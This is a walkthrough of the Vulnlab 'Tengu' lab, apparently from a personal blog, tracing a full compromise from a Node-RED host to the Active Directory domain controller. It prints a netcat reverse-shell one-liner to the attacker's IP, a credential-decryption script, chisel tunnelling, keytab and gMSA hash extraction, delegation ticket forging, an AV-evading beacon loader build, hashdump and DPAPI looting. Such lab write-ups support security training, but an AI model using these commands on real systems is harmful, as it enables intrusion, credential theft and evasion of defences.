---
title: Vulnlab - Tengu
date: 2025-02-06 02:30:00 +/-TTTT
categories: [VulnLab]
tags: [gmsa, allowedtodelegate, potato, dpapi]     # TAG names should always be lowercase
image : /assets/images/tengu_slide.png
---
![img-description](/assets/images/tengu_slide.png)

10.10.158.53
10.10.158.54
10.10.158.55

## Linux
we got hosts so lets go

#### Portscan

    Machine 0x1
    PORT     STATE SERVICE
    3389/tcp   open  domain

    Machine 0x2
    PORT     STATE SERVICE
    3389/tcp   open  domain

    Machine 0x3
    PORT     STATE SERVICE
    22/tcp     open  ssh
    1880/tcp   open  vsat-control

this is really interesting

we have 1 Linux and 2 Windows machine.

i wanna check hostnames for windows

    ➜  Tengu nxc rdp 10.10.158.54
    RDP         10.10.158.54    3389   SQL              [*] Windows 10 or Windows Server 2016 Build 20348 (name:SQL) (domain:tengu.vl) (nla:True)
DC
    ➜  Tengu nxc rdp 10.10.158.53
    RDP         10.10.158.53    3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:tengu.vl) (nla:True)

we found DC and SQL

and we have website on 1880

![alt text](<../assets/images/1 (6).png>)

so its seems like basic sql tab like we can run exec command and it will do on sql and put data at /tmp/output so lets go

i put exec command between timestamp to SQL

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.2.152 9001 >/tmp/f

![alt text](<../assets/images/2 (6).png>)

and i got reverse shell after i click deploy

![alt text](<../assets/images/Screenshot_2025-02-04_17_07_50.png>)

    ➜  Tengu nc -nvlp 9001
    listening on [any] 9001 ...
    connect to [10.8.2.152] from (UNKNOWN) [10.10.158.55] 49704
    bash: cannot set terminal process group (435): Inappropriate ioctl for device
    bash: no job control in this shell
    nodered_svc@nodered:/opt/nodered$ python3 -c 'import pty;pty.spawn("/bin/bash")'
    <red$ python3 -c 'import pty;pty.spawn("/bin/bash")'
    nodered_svc@nodered:/opt/nodered$ export TERM=xterm
    export TERM=xterm
    nodered_svc@nodered:/opt/nodered$ ^Z
    [1]  + 1160209 suspended  nc -nvlp 9001
    ➜  Tengu stty raw -echo;fg
    [1]  + 1160209 continued  nc -nvlp 9001

    nodered_svc@nodered:/opt/nodered$ id
    uid=1001(nodered_svc) gid=1001(nodered_svc) groups=1001(nodered_svc)

our users home dirs is not look like default so that could be way

![alt text](<../assets/images/Screenshot_2025-02-04_17_09_57.png>)

i think we found creds we just need to crack it

    nodered_svc@nodered:~/.node-red$ ls
    flows_cred.json  lib           package.json       settings.js
    flows.json       node_modules  package-lock.json
    nodered_svc@nodered:~/.node-red$ cat flows_cred.json
    {
        "$": "7f5ab122acc2c24df1250a302916c1a6QT2eBZTys+V0xdb7c6VbXMXw2wbn/Q3r/ZcthJlrvm3XLJ8lSxiq+FAWF0l3Bg9zMaNgsELXPXfbKbJPxtjkD9ju+WJrZBRq/O40hpJzWoKASeD+w2o="

![alt text](<../assets/images/3 (4).png>)

i just did it if files name is default and its seems deafult

its seems like great source

[BLOG FOR THIS](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/)

that could be our script

    #!/bin/bash
    #
    # Decrypt flows_cred.json from a NodeRED data directory
    #
    # Usage
    # ./node-red-decrypt-flows-cred.sh ./node_red_data
    #
    jq  '.["$"]' -j $1/flows_cred.json | \
    cut -c 33- | \
    openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r '.["$"]' $1/flows_cred.json | cut -c 1-32` -K `jq -j '._credentialSecret' $1/.config.runtime.json | sha256sum | cut -c 1-64`

this is how to work 😉

    ➜  10.10.158.55:8000 ls -la
    total 16
    drwxrwxr-x 3 root root 4096 Feb  4 17:19 .
    drwxrwxr-x 4 root root 4096 Feb  4 17:16 ..
    -rw-rw-r-- 1 root root  366 Feb  4 17:19 crack.sh
    drwxrwxr-x 4 root root 4096 Feb  4 17:16 .node-red
    ➜  10.10.158.55:8000 bash crack.sh .node-red
    {"d237b4c16a396b9e":{"username":"nodered_connector","password":"DreamPuppyOverall25"}}

DreamPuppyOverall25 lets try this

its actually not work for labadmin

    nodered_svc@nodered:/home$ su - labadmin
    Password: 
    su: Authentication failure

we have 2 ip adress more but we just got 3389 open so lets so socks forwarding at nmap again

#### socks-forwarding

    ➜  Tengu ./chisel_linux server -p 1234 --reverse

    2025/02/04 17:23:00 server: Reverse tunnelling enabled
    2025/02/04 17:23:00 server: Fingerprint UgoHoiO5AkZoB5rF4iwRiwEsidpbPtqOukhtZxIW7kQ=
    2025/02/04 17:23:00 server: Listening on http://0.0.0.0:1234
    2025/02/04 17:23:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
at target
    nodered_svc@nodered:/tmp$ ./chisel_linux client 10.8.2.152:1234 R:1080:socks
    2025/02/04 23:23:47 client: Connecting to ws://10.8.2.152:1234
    2025/02/04 23:23:47 client: Connected (Latency 72.646467ms)

now we got smb back from DC and SQL

    ➜  Tengu proxychains -q nxc smb 10.10.158.53
    SMB         10.10.158.53    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
    ➜  Tengu proxychains -q nxc smb 10.10.158.54
    SMB         10.10.158.54    445    SQL              [*] Windows Server 2022 Build 20348 (name:SQL) (domain:tengu.vl) (signing:False) (SMBv1:False)

so we got creds maybe its about mssql while we working with SQL part at starting part and actually our creds work here with —local-auth flag

    ➜  Tengu proxychains -q nxc mssql 10.10.158.54 -u "nodered_connector" -p "DreamPuppyOverall25" 
    MSSQL       10.10.158.54    1433   SQL              [*] Windows Server 2022 Build 20348 (name:SQL) (domain:tengu.vl)
    MSSQL       10.10.158.54    1433   SQL              [-] tengu.vl\nodered_connector:DreamPuppyOverall25 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
    ➜  Tengu proxychains -q nxc mssql 10.10.158.54 -u "nodered_connector" -p "DreamPuppyOverall25"  --local-auth
    MSSQL       10.10.158.54    1433   SQL              [*] Windows Server 2022 Build 20348 (name:SQL) (domain:tengu.vl)
    MSSQL       10.10.158.54    1433   SQL              [+] SQL\nodered_connector:DreamPuppyOverall25 

we can run command directly 😉

    ➜  Tengu proxychains -q nxc mssql 10.10.158.54 -u "nodered_connector" -p "DreamPuppyOverall25"  --local-auth -q "SELECT @@Version"
    MSSQL       10.10.158.54    1433   SQL              [*] Windows Server 2022 Build 20348 (name:SQL) (domain:tengu.vl)
    MSSQL       10.10.158.54    1433   SQL              [+] SQL\nodered_connector:DreamPuppyOverall25 
    MSSQL       10.10.158.54    1433   SQL              Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
        Oct  8 2022 05:58:25 
        Copyright (C) 2022 Microsoft Corporation
        Developer Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)

lets get mssql connect

    ➜  Tengu proxychains -q python3 /opt/impacket/examples/mssqlclient.py tengu.vl/nodered_connector:'DreamPuppyOverall25'@10.10.158.54             
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: Dev
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(SQL): Line 1: Changed database context to 'Dev'.
    [*] INFO(SQL): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
    [!] Press help for extra shell commands
    SQL (nodered_connector  nodered_connector@Dev)> 

we found hash

    SQL (nodered_connector  nodered_connector@Dev)> SELECT name FROM master..sysdatabases
    name     
    ------   
    master   

    tempdb   

    model    

    msdb     

    Demo     

    Dev      

    SQL (nodered_connector  nodered_connector@Dev)> USE Demo;
    ENVCHANGE(DATABASE): Old Value: Dev, New Value: Demo
    INFO(SQL): Line 1: Changed database context to 'Demo'.
    SQL (nodered_connector  nodered_connector@Demo)> SELECT name FROM sys.tables;
    name    
    -----   
    Users   

    SQL (nodered_connector  nodered_connector@Demo)> SELECT * FROM Users;
    ID   Username          Password                                                              
    ----   ---------------   -------------------------------------------------------------------   
    NULL   b't2_m.winters'   b'af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147' 

btw there is nothing at DEV

    SQL (nodered_connector  nodered_connector@Demo)> USE Dev;
    ENVCHANGE(DATABASE): Old Value: Demo, New Value: Dev
    INFO(SQL): Line 1: Changed database context to 'Dev'.
    SQL (nodered_connector  nodered_connector@Dev)> SELECT name FROM sys.tables;
    name   
    ----   
    Task   

    SQL (nodered_connector  nodered_connector@Dev)> SELECT * FROM Task;
    Last_Backup   Success   
    -----------   -------   
    b'Today'      b'True'

letsc check hashid

    ➜  images hashid af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147
    Analyzing 'af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147'
    [+] Snefru-256 
    [+] SHA-256 
    [+] RIPEMD-256 
    [+] Haval-256 
    [+] GOST R 34.11-94 
    [+] GOST CryptoPro S-Box 
    [+] SHA3-256 
    [+] Skein-256 
    [+] Skein-512(256) 

i think it can crackable if exist at crackstation

we got new creds Tengu123

![alt text](<../assets/images/4 (3).png>)

its actually work for ssh user is t2_m.winters

    ➜  Tengu ssh tengu.vl\\t2_m.winters@10.10.158.55
    (tengu.vl\t2_m.winters@10.10.158.55) Password: 
    t2_m.winters@tengu.vl@nodered:~$ sudo -l
    [sudo] password for t2_m.winters@tengu.vl: 

    Sorry, try again.
    [sudo] password for t2_m.winters@tengu.vl: 
    Sorry, try again.
    [sudo] password for t2_m.winters@tengu.vl: 
    Matching Defaults entries for t2_m.winters@tengu.vl on nodered:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    User t2_m.winters@tengu.vl may run the following commands on nodered:
        (ALL : ALL) ALL
    t2_m.winters@tengu.

i think those creds can use on other hosts

t2_m.winters : Tengu123

and its work

    ➜  Tengu proxychains -q nxc smb DC -u "t2_m.winters" -p "Tengu123" --shares
    SMB         10.10.158.53    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
    SMB         10.10.158.53    445    DC               [+] tengu.vl\t2_m.winters:Tengu123 
    SMB         10.10.158.53    445    DC               [*] Enumerated shares
    SMB         10.10.158.53    445    DC               Share           Permissions     Remark
    SMB         10.10.158.53    445    DC               -----           -----------     ------
    SMB         10.10.158.53    445    DC               ADMIN$                          Remote Admin
    SMB         10.10.158.53    445    DC               C$                              Default share
    SMB         10.10.158.53    445    DC               IPC$            READ            Remote IPC
    SMB         10.10.158.53    445    DC               NETLOGON        READ            Logon server share 
    SMB         10.10.158.53    445    DC               SYSVOL          READ            Logon server share 

but there is nothing interesting at shares lets check if we can dump bloodhound data

and yeah its possbile

    ➜  bloodhound proxychains -q nxc ldap DC.tengu.vl -u "t2_m.winters" -p "Tengu123" --bloodhound --dns-server 10.10.158.53 --collection All
    SMB         10.10.158.53    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
    LDAP        10.10.158.53    389    DC               [+] tengu.vl\t2_m.winters:Tengu123 
    LDAP        10.10.158.53    389    DC               Resolved collection methods: localadmin, dcom, session, trusts, container, psremote, rdp, objectprops, acl, group
    LDAP        10.10.158.53    389    DC               Done in 00M 23S
    LDAP        10.10.158.53    389    DC               Compressing output into /root/.nxc/logs/DC_10.10.158.53_2025-02-04_175121_bloodhound.zip

### ReadGMSAPassword

btw before bloodhound we can guess way from linux server 😉

we have krb5cc_1317801117_UZ8tI

![alt text](<../assets/images/Screenshot_2025-02-04_17_56_06.png>)

so we can verify it with bloodhound

our computer we got NORDERED and lets go Outbound Object Control

![alt text](<../assets/images/5 (3).png>)

we have redgmsapassword for GMSA01

im gonna use that while we have file

[KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

    root@nodered:/etc# ls -la *.keytab
    -rw------- 1 root root 650 Mär 26  2024 krb5.keytab

and boom

    ➜  KeyTabExtract git:(master) ✗ python3 keytabextract.py krb5.keytab 
    [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
    [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
    [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
    [+] Keytab File successfully imported.
            REALM : TENGU.VL
            SERVICE PRINCIPAL : NODERED$/
            NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
            AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
            AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f

new creds

NODERED$ : d4210ee2db0c03aa3611c9ef8a4dbf49

We can use netexew —gmsa modules or flag for dump new creds


    ➜  Tengu proxychains -q nxc ldap DC.tengu.vl -u "NODERED$" -H "d4210ee2db0c03aa3611c9ef8a4dbf49" --gmsa
    SMB         224.0.0.1       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
    LDAPS       224.0.0.1       636    DC               [+] tengu.vl\NODERED$:d4210ee2db0c03aa3611c9ef8a4dbf49 
    LDAPS       224.0.0.1       636    DC               [*] Getting GMSA Passwords
    LDAPS       224.0.0.1       636    DC               Account: gMSA01$              NTLM: 9fac1a6c91b365f30fa517fac842155a
    LDAPS       224.0.0.1       636    DC               Account: gMSA02$              NTLM:

and boom

now time to look what our user can do gMSA01$

### AllowedToDelegate

![alt text](<../assets/images/6 (1).png>)

instead of doing allowedtodelegate computer we can try on group users

i think we can use any of them

![alt text](<../assets/images/7 (1).png>)

lets use T1_C.FOWLER

bloodhound also gave us command

    getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'

![alt text](<../assets/images/Screenshot_2025-02-04_18_18_24.png>)

we got xp_cmdshell as admin so lets get shell here with xp_cmdshell

    ➜  Tengu proxychains -q python3 /opt/impacket/examples/getST.py -spn 'MSSQLSvc/sql.tengu.vl' -dc-ip DC.tengu.vl -impersonate 'T1_M.WINTERS' -hashes :9fac1a6c91b365f30fa517fac842155a 'tengu.vl/gmsa01' 
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [-] CCache file is not found. Skipping...
    [*] Getting TGT for user
    [*] Impersonating T1_M.WINTERS
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in T1_M.WINTERS@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache
    ➜  Tengu export KRB5CCNAME=T1_M.WINTERS@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache 
    ➜  Tengu vim /etc/hosts
    ➜  Tengu proxychains -q python3 /opt/impacket/examples/mssqlclient.py -k sql.tengu.vl
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(SQL): Line 1: Changed database context to 'master'.
    [*] INFO(SQL): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
    [!] Press help for extra shell commands
    SQL (TENGU\t1_m.winters  dbo@master)> 

im gonna upload here my beacon then im gonna use very simple way

[Shhhloader](https://github.com/icyguider/Shhhloader)

lets upload it

    (venv) ➜  Shhhloader git:(main) ✗ python3 Shhhloader.py beacon_x64.bin -o a.exe
    ┳┻|
    ┻┳|
    ┳┻|
    ┻┳|
    ┳┻| _
    ┻┳| •.•)  - Shhhhh, AV might hear us! 
    ┳┻|⊂ﾉ   
    ┻┳|
    [+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER
    [+] Using explorer.exe for QueueUserAPC injection
    [+] Using GetSyscallStub for syscalls
    [+] Attemping to use non-privileged explorer.exe for PPID Spoofing
    [+] Using sleep technique for sandbox evasion
    [+] Randomizing syscall names
    [+] Saved new stub to stub.cpp
    [+] Compiling new stub...
    [!] a.exe has been compiled successfully!

and we get our beacon here

![alt text](<../assets/images/Screenshot_2025-02-04_18_50_13.png>)

### SeImpersonatePrivilege

lets get admin shell fastly

im gonna use that

[AgressorCNA](https://github.com/scanfsec/AggressorCNA)

or we can also use this

[spoolsystem](https://github.com/rxwx/spoolsystem)

second one really look like useful

![alt text](<../assets/images/9.png>)

lets get system beacon

![alt text](<../assets/images/10.png>)

or we can use normal way to get system shell

and we got system beacon

![alt text](<../assets/images/11.png>)

    [02/04 19:16:56] beacon> hashdump
    [02/04 19:16:56] [*] Tasked beacon to dump hashes
    [02/04 19:16:57] [+] host called home, sent: 83198 bytes
    [02/04 19:16:59] [+] received password hashes:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:73db3fdd24bee6eeb5aac7e17e4aba4c:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a4be65de5834374c1df6b157d6bf8d64:::

### dpapi

    ➜  Tengu proxychains -q nxc smb SQL -u Administrator -H '73db3fdd24bee6eeb5aac7e17e4aba4c' --local-auth --dpapi
    SMB         10.10.158.54    445    SQL              [*] Windows Server 2022 Build 20348 (name:SQL) (domain:SQL) (signing:False) (SMBv1:False)
    SMB         10.10.158.54    445    SQL              [+] SQL\Administrator:73db3fdd24bee6eeb5aac7e17e4aba4c (Pwn3d!)
    SMB         10.10.158.54    445    SQL              [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
    SMB         10.10.158.54    445    SQL              [+] Got 5 decrypted masterkeys. Looting secrets...
    SMB         10.10.158.54    445    SQL              [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2} - TENGU\T0_c.fowler:UntrimmedDisplaceModify25

He is local admin !!!!!

and BOOOM!!!

    ➜  bofs proxychains -q nxc smb DC.tengu.vl -u 'T0_c.fowler' -p 'UntrimmedDisplaceModify25' -k -X 'type C:\Users\Administrator\Desktop\root.txt'
    SMB         DC.tengu.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
    SMB         DC.tengu.vl     445    DC               [+] tengu.vl\T0_c.fowler:UntrimmedDisplaceModify25 (Pwn3d!)
    SMB         DC.tengu.vl     445    DC               [+] Executed command via wmiexec
    SMB         DC.tengu.vl     445    DC               #< CLIXML
    SMB         DC.tengu.vl     445    DC               VL{ananamı}
    SMB         DC.tengu.vl     445    DC               <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>

